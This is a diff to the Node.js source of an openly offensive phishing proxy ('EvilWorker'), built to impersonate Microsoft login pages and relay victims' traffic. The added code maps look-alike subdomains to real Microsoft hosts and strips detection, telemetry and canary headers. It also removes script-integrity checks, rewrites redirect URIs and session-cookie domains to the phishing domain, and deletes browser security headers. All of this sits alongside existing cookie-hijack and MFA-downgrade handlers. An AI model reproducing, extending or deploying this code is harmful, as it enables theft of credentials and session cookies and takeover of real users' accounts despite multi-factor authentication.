@@ -1,5 +1,5 @@
 // ============================================================
-// FINAL STEALTH PROXY SERVER – EvilWorker Core, Zero Signature
+// FINAL STEALTH PROXY SERVER – EvilWorker Core + Carlos Tactics
 // Customized for file paths:
 //   portal_a7x9k.html, error_4m2p.html, worker_8t2r.js, assets/bundle_x9f3.js
 // ============================================================
@@ -36,26 +36,40 @@ const PHISHING_DOMAIN = process.env.PHISHING_DOMAIN || 'localhost';
 const REDIRECT_URL = process.env.REDIRECT_URL || 'https://www.google.com';
 const TARGET_HOST = process.env.TARGET_HOST || 'login.microsoftonline.com';
 
+// ---- Bidirectional domain mapping (Carlos technique) ----
+const SUBDOMAIN_MAPPING = {
+  [PHISHING_DOMAIN]: TARGET_HOST,
+  [`login.${PHISHING_DOMAIN}`]: 'login.microsoft.com',
+  [`office.${PHISHING_DOMAIN}`]: 'www.office.com',
+  [`cdn.${PHISHING_DOMAIN}`]: 'aadcdn.msftauth.net',
+  [`static.${PHISHING_DOMAIN}`]: 'aadcdn.msauth.net',
+  [`live.${PHISHING_DOMAIN}`]: 'login.live.com'
+};
+const REVERSE_MAPPING = {};
+for (const [phish, real] of Object.entries(SUBDOMAIN_MAPPING)) {
+  REVERSE_MAPPING[real] = phish;
+}
+
 // ---- Obfuscated entry point - looks like OAuth ----
-const ENTRY_PATH = '/auth/start';          // <-- Change this to your own entry path
-const TARGET_PARAM = 'dest';               // <-- Change this to your own parameter name
+const ENTRY_PATH = '/auth/start';
+const TARGET_PARAM = 'dest';
 
 // ---- File paths (matching your custom names) ----
 const FILES = {
-  index: 'portal_a7x9k.html',          // Your custom index
-  notFound: 'error_4m2p.html',         // Your custom 404
-  script: 'assets/bundle_x9f3.js'      // Your custom script (in assets folder)
+  index: 'portal_a7x9k.html',
+  notFound: 'error_4m2p.html',
+  script: 'assets/bundle_x9f3.js'
 };
 const PATHS = {
-  relay: '/api/gateway',               // <-- Change relay endpoint
-  serviceWorker: '/worker_8t2r.js',    // <-- Your custom SW filename
-  script: '/assets/bundle_x9f3.js',    // <-- Your custom script URL path
-  nav: '/api/nav',                     // <-- Change nav endpoint
-  session: '/api/session'              // <-- Change session endpoint
+  relay: '/api/gateway',
+  serviceWorker: '/worker_8t2r.js',
+  script: '/assets/bundle_x9f3.js',
+  nav: '/api/nav',
+  session: '/api/session'
 };
 
 // ---- Logging directory ----
-const LOG_DIR = join(process.cwd(), 'data');   // Change to 'logs' or anything
+const LOG_DIR = join(process.cwd(), 'data');
 if (!existsSync(LOG_DIR)) mkdirSync(LOG_DIR);
 const logStreams = {};
 
@@ -71,6 +85,8 @@ class StealthProxy {
     this.phishingDomain = PHISHING_DOMAIN;
     this.redirectUrl = REDIRECT_URL;
     this.targetHost = TARGET_HOST;
+    this.subdomainMap = SUBDOMAIN_MAPPING;
+    this.reverseMap = REVERSE_MAPPING;
   }
 
   // ---- HTTP Server entry ----
@@ -83,6 +99,19 @@ class StealthProxy {
   async _onRequest(req, res) {
     const { method, url, headers } = req;
     const sessionId = this._getSession(headers.cookie);
+
+    // ---- Preflight (OPTIONS) handling (Carlos technique) ----
+    if (method === 'OPTIONS') {
+      res.writeHead(204, {
+        'Access-Control-Allow-Origin': `https://${headers.host}`,
+        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
+        'Access-Control-Allow-Headers': 'Content-Type, Authorization, Cookie, Set-Cookie',
+        'Access-Control-Allow-Credentials': 'true',
+        'Access-Control-Max-Age': '86400'
+      });
+      res.end();
+      return;
+    }
 
     // ---- Serve index page (phishing entry) ----
     if (url.startsWith(ENTRY_PATH) && url.includes(TARGET_PARAM)) {
@@ -97,21 +126,17 @@ class StealthProxy {
       return this._serveFile(res, FILES.script, 'text/javascript');
     }
     if (url === PATHS.relay && !sessionId) {
-      // Anonymous relay attempt – try to create session from target param
       return this._handleAnonymousRelay(req, res);
     }
 
     // ---- Authenticated session or relay endpoint ----
     if (sessionId || url === PATHS.relay) {
       if (url === PATHS.session) {
-        // Cookie hijack endpoint
         return this._handleCookieHijack(req, res, sessionId);
       }
       if (url === PATHS.nav) {
-        // Navigation rewrite endpoint (MutationObserver)
         return this._handleNavRewrite(req, res, sessionId);
       }
-      // Otherwise, process as a proxied request
       return this._handleProxiedRequest(req, res, sessionId);
     }
 
@@ -201,7 +226,6 @@ class StealthProxy {
         path: target.pathname + target.search,
         host: target.host
       };
-      // Redirect to the proxied path
       const redirect = `${sessions[name].target.protocol}//${req.headers.host}${sessions[name].target.path}`;
       res.writeHead(302, { Location: redirect });
       res.end();
@@ -217,7 +241,6 @@ class StealthProxy {
     req.on('data', chunk => body += chunk);
     req.on('end', () => {
       if (sessionId) {
-        // Update session cookies with the hijacked cookie data
         this._updateCookies(sessionId, [body], req.headers.host);
         const domains = this._getValidDomains([req.headers.host, sessions[sessionId].target.hostname]);
         res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -236,7 +259,6 @@ class StealthProxy {
     if (!targetParam) { res.writeHead(400); return res.end(); }
     try {
       const target = new URL(decodeURIComponent(targetParam));
-      // Update session target (for cross-origin navigation)
       if (sessionId) {
         sessions[sessionId].target = {
           protocol: target.protocol,
@@ -272,26 +294,39 @@ class StealthProxy {
       if (t) targetUrl = new URL(decodeURIComponent(t));
     }
     if (!targetUrl) {
-      // Use session target
       const t = session.target;
       targetUrl = new URL(t.protocol + '//' + t.host + t.path);
     }
 
-    // Update session target if navigation request (mode determined from headers)
+    // ---- Domain rewriting via mapping (Carlos technique) ----
+    // Rewrite target host using SUBDOMAIN_MAPPING (if phishing domain appears)
+    let targetHostname = targetUrl.hostname;
+    // If the target hostname is one of our phishing subdomains, map to real
+    if (this.subdomainMap[targetHostname]) {
+      targetHostname = this.subdomainMap[targetHostname];
+      targetUrl.hostname = targetHostname;
+    }
+    // Also rewrite the host header if it's a phishing domain
+    let effectiveHost = headers.host;
+    if (this.subdomainMap[effectiveHost]) {
+      effectiveHost = this.subdomainMap[effectiveHost];
+    }
+
+    // Update session target if navigation request
     const isNav = headers['sec-fetch-mode'] === 'navigate' || headers['upgrade-insecure-requests'] === '1';
     if (isNav) {
       session.target = {
         protocol: targetUrl.protocol,
-        hostname: targetUrl.hostname,
+        hostname: targetHostname,
         port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
         path: targetUrl.pathname + targetUrl.search,
-        host: targetUrl.host
+        host: effectiveHost
       };
     }
 
     // Forward request to target
     const options = {
-      hostname: targetUrl.hostname,
+      hostname: targetHostname,
       port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
       method: method,
       path: targetUrl.pathname + targetUrl.search,
@@ -300,11 +335,16 @@ class StealthProxy {
     };
     // Remove host header override
     delete options.headers.host;
-    // Set correct host
-    options.headers.host = targetUrl.host;
+    // Set correct host (real Microsoft domain)
+    options.headers.host = effectiveHost;
 
-    // Remove unwanted headers
-    const dropHeaders = ['x-forwarded-for', 'x-arr-log-id', 'client-ip', 'x-site-deployment-id'];
+    // Remove unwanted headers – expanded for Canary headers (Carlos)
+    const dropHeaders = [
+      'x-forwarded-for', 'x-arr-log-id', 'client-ip', 'x-site-deployment-id',
+      'x-canary', 'x-microsoft-telemetry', 'x-ms-telemetry', 'x-ms-request-id',
+      'x-forwarded-proto', 'x-appservice-proto', 'x-arr-ssl', 'x-forwarded-tlsversion',
+      'x-original-url', 'x-waws-unencoded-url', 'x-client-ip', 'x-client-port'
+    ];
     for (const h of dropHeaders) delete options.headers[h];
 
     // Prepare request body
@@ -324,14 +364,13 @@ class StealthProxy {
           body: body.toString('utf8')
         }).catch(() => {});
 
-        // ---- MFA Downgrade (Carlos tactic) ----
+        // ---- MFA Downgrade (Carlos) ----
         let isJson = proxyRes.headers['content-type']?.includes('application/json');
         let isHtml = proxyRes.headers['content-type']?.includes('text/html');
         let responseBody = [];
         proxyRes.on('data', chunk => responseBody.push(chunk));
         proxyRes.on('end', async () => {
           let fullBody = Buffer.concat(responseBody);
-          let finalBody = fullBody;
 
           // Decompress if needed
           let encodings = [];
@@ -370,16 +409,22 @@ class StealthProxy {
             } catch (e) {}
           }
 
-          // ---- HTML injection (stealth dynamic) ----
+          // ---- HTML injection + SRI removal + redirect_uri rewriting ----
           if (isHtml) {
             let html = fullBody.toString('utf8');
-            // Redirect_uri rewriting
+
+            // SRI removal (Carlos)
+            html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
+            html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
+            html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
+
+            // redirect_uri rewriting
             html = html.replace(/redirect_uri=https%3A%2F%2Flogin\.microsoftonline\.com/g,
                                 `redirect_uri=https%3A%2F%2F${this.phishingDomain}`);
             html = html.replace(/redirect_uri=https:\/\/login\.microsoftonline\.com/g,
                                 `redirect_uri=https://${this.phishingDomain}`);
 
-            // Inject script dynamically (no static <script src>)
+            // Dynamic script injection (no static <script src>)
             const injectCode = `
               <script>
                 (async function() {
@@ -403,6 +448,23 @@ class StealthProxy {
             fullBody = Buffer.from(html);
           }
 
+          // ---- Server‑side Set-Cookie domain rewriting (Carlos) ----
+          if (proxyRes.headers['set-cookie']) {
+            const originalCookies = proxyRes.headers['set-cookie'];
+            let rewrittenCookies = Array.isArray(originalCookies) ? originalCookies : [originalCookies];
+            rewrittenCookies = rewrittenCookies.map(cookie => {
+              let newCookie = cookie;
+              // Replace Microsoft domains with phishing domain
+              newCookie = newCookie.replace(/Domain=\.?microsoftonline\.com/gi, `Domain=.${this.phishingDomain}`);
+              newCookie = newCookie.replace(/Domain=\.?login\.microsoft\.com/gi, `Domain=.${this.phishingDomain}`);
+              newCookie = newCookie.replace(/Domain=\.?login\.live\.com/gi, `Domain=.${this.phishingDomain}`);
+              newCookie = newCookie.replace(/Domain=\.?aadcdn\.msftauth\.net/gi, `Domain=.${this.phishingDomain}`);
+              newCookie = newCookie.replace(/Domain=\.?aadcdn\.msauth\.net/gi, `Domain=.${this.phishingDomain}`);
+              return newCookie;
+            });
+            proxyRes.headers['set-cookie'] = rewrittenCookies.join(', ');
+          }
+
           // ---- Re-compress if needed ----
           if (encodings.length) {
             for (let enc of encodings.reverse()) {
@@ -415,10 +477,19 @@ class StealthProxy {
             }
           }
 
-          // Send response
+          // ---- Send response with modified headers ----
           const newHeaders = { ...proxyRes.headers };
+          // Remove security headers (already done via deleteHTTPSecurityResponseHeaders but we do it here)
           delete newHeaders['content-security-policy'];
           delete newHeaders['x-frame-options'];
+          delete newHeaders['x-xss-protection'];
+          delete newHeaders['x-content-type-options'];
+          delete newHeaders['cross-origin-opener-policy'];
+          delete newHeaders['cross-origin-embedder-policy'];
+          delete newHeaders['cross-origin-resource-policy'];
+          delete newHeaders['permissions-policy'];
+          delete newHeaders['service-worker-allowed'];
+          // Add CORS and cache control
           newHeaders['cache-control'] = 'no-store';
           newHeaders['access-control-allow-origin'] = `https://${req.headers.host}`;
           if (newHeaders['content-length']) {
